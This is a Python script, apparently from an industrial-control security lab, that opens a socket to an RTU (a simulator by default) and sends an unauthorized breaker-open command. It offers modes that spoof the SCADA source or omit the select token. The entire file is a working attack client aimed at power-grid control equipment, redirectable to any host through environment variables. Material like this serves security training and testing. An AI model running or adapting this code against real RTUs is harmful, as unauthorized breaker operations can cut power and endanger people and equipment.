import argparse
import os
import socket

from app.protocol import attack_execute_breaker, decode_message, encode_message


def main() -> None:
    parser = argparse.ArgumentParser(description="Send unauthorized breaker OPEN directly to the RTU.")
    parser.add_argument(
        "--mode",
        choices=["spoof-scada", "honest-attacker", "missing-select-token"],
        default="spoof-scada",
        help="Attack mode. Default is spoof-scada.",
    )
    args = parser.parse_args()

    host = os.getenv("RTU_HOST", "rtu-simulator")
    port = int(os.getenv("RTU_PORT", "2404"))
    message = attack_execute_breaker(args.mode)

    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(encode_message(message))
        response = b""
        while not response.endswith(b"\n"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

    print("Sent unauthorized EXECUTE_BREAKER OPEN")
    print(f"Mode: {args.mode}")
    print(f"Claimed source: {message['source']}")
    print(f"Correlation ID: {message['correlation_id']}")
    print(f"RTU response: {decode_message(response)}")


if __name__ == "__main__":
    main()
